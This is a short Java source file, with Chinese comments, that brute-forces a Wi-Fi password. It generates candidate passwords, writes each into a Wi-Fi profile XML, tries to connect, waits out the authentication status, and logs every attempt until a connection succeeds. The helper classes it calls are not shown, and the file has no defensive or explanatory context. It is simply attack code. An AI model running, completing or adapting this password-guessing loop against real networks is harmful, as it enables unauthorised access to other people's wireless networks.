package com;

import java.util.Arrays;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class WifiAction {

	private static Logger logger = LogManager.getLogger(WifiAction.class);

	public static void main(String[] args) throws Exception {
		// Wi-Fi 配置檔路徑
		String profilePath = "D:/wifi.xml";
		// 配置檔名稱
		String profileName = "Jun";

		PassWordService pwService = new PassWordService("78", 8);

		String pw;
		int count = 0;

		while ((pw = pwService.next()) != null) {
			// 產出xml
			String xmlPath = XmlTemp.getXmlTemp(profileName, pw, profilePath);
			// 連接
			ConnectWifi.toConn(profilePath, profileName);

			// 取得資訊
			String info = WifiInfo.getInfo();
			
			while (info.contains("正在驗證")  || info.contains("正在產生關聯")) {
				Thread.sleep(500);
				info = WifiInfo.getInfo();
			}
			count++;
			System.out.println(count + "\t" + pw + "\t" + info + "\t" + Arrays.toString(pwService.getIndexPosition()));
			logger.info(count + "\t" + pw + "\t" + info + "\t" + Arrays.toString(pwService.getIndexPosition()));
			if(info.contains(":連線")) {
				System.out.println("結束");
				break;
			}
		}
	}
}
